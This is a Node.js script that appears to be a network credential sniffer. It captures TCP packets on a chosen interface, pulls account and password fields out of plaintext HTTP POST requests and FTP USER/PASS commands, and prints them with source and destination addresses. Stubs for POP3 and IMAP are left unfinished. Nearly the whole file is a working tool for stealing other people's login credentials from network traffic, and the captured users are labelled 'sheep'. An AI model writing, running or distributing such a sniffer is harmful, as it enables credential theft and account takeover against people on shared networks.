var nic = process.argv[2];
var qs = require('querystring');
var protocol = require('./ports_table');
var pcap = require('./node_modules/pcap'),
    pcap_session = pcap.createSession(nic, 'ip proto \\tcp');


function GetHTTPLoginAccount(data) {
    var account = 'None';

    if (data.account) {
        account = data.account;
    } else if (data.identification) {
        account = data.identification;
    } else if (data.username) {
        account = data.username;
    } else if (data.id) {
        account = data.id;
    } else if (data.os_username) {
        account = data.os_username;
    } else if (data.txtAccount) {
        account = data.txtAccount;
    } else if (data.email) {
        account = data.email;
    } else if (data.loginAccount) {
        account = data.loginAccount;
    } else {
        console.log('[-] Can not find account pattern');
    }
    return account;
}

function GetHTTPLoginPassword(data) {
    var password = 'None';

    if (data.password) {
        password = data.password;
    } else if (data.os_password) {
        password = data.os_password;
    } else if (data.txtPwd) {
        password = data.txtPwd;
    } else if (data.loginPasswd) {
        password = data.loginPasswd;
    } else {
        console.log('[-] Can not find password pattern');
    }
    return password;
}

function HTTPPostParser(packet) {
    var data = packet.payload.payload.payload.data.toString('ascii');

    // DEBUG usage
    // console.log(data);

    // Source MAC address
    var shost = packet.payload.shost.toString('ascii');

    // Source IP address
    var saddr = packet.payload.payload.saddr.toString('ascii');

    // Dst IP address
    var daddr = packet.payload.payload.daddr.toString('ascii');

    // Source port
    var sport = packet.payload.payload.payload.sport.toString();

    // Dst port
    var dport = packet.payload.payload.payload.dport.toString();

    var isPOST = data.indexOf('POST');
    // If there is a POST method
    if (isPOST > -1) {
        // HTTP header with conten
        // console.log(data);
        var headerContent = data.split('\r\n');

        // console.log(headerContent);

        // returns the last element (querystring) and removes it from the array
        var lastContent = headerContent.pop();

        var sheepInfo = qs.parse(lastContent);

        // For DEGUG print
        // console.log(sheepInfo);

        var account = GetHTTPLoginAccount(sheepInfo);
        var password = GetHTTPLoginPassword(sheepInfo);

        ConsolePrinter(shost, saddr, daddr, sport, dport, account, password);

    }

}

function FTPloginParser(packet) {
    var data = packet.payload.payload.payload.data.toString('ascii');

    // Source MAC address
    var shost = packet.payload.shost.toString('ascii');

    // Source IP address
    var saddr = packet.payload.payload.saddr.toString('ascii');

    // Dst IP address
    var daddr = packet.payload.payload.daddr.toString('ascii');

    // Source port
    var sport = packet.payload.payload.payload.sport.toString();

    // Dst port
    var dport = packet.payload.payload.payload.dport.toString();

    var ftp_user_re = /^USER (.*)$/;
    var ftp_pw_re = /^PASS (.*)$/;
    var splitted = data.split('\r\n');

    var isUSER = splitted[0].indexOf('USER');
    var isPASS = splitted[0].indexOf('PASS');

    if (isUSER > -1 || isPASS > -1) {
        var user = splitted[0].match(ftp_user_re);
        var pass = splitted[0].match(ftp_pw_re);
        if (user !== null) {
            ConsolePrinter(shost, saddr, daddr, sport, dport, user[1], null);
        }
        if (pass !== null) {
            ConsolePrinter(shost, saddr, daddr, sport, dport, null, pass[1]);
        }
    }

}

function ConsolePrinter(shost, srcIP, dstIP, sport, dport, account, password) {
    if (account !== null) {
        console.log('[' + srcIP + ':' +  sport + ' -> ' + dstIP + ':' +  dport + '] Account: ' + account);
    }
    if (password !== null) {
        console.log('[' + srcIP + ':' +  sport + ' -> ' + dstIP + ':' +  dport + '] Password: ' + password);
    }
}

if (!nic) {
    console.log('[*] Specify an interface name for capture.');
    process.exit(1);
} else {
    console.log('[*] Using interface: ' + nic);
}

pcap_session.on('packet', function (raw_packet) {

    var packet = pcap.decode.packet(raw_packet);
    // console.log(packet);

    var isHTTP = packet.payload.payload.payload.dport === 80 && packet.payload.payload.payload.data !== null;
    var isFTP = packet.payload.payload.payload.dport === 21  && packet.payload.payload.payload.data !== null;
    var isPOP3 = packet.payload.payload.payload.dport === 110  && packet.payload.payload.payload.data !== null;
    var isIMAP = packet.payload.payload.payload.dport === 143  && packet.payload.payload.payload.data !== null;

    // For all protocols we interested and also data not null
    if (isHTTP) {
      HTTPPostParser(packet);
    } else if (isFTP) {
      FTPloginParser(packet);
    } else if (isPOP3) {
        // TODO parse POP3
    } else if (isIMAP) {
        // TODO parse IMAP
    } else {

    }
});
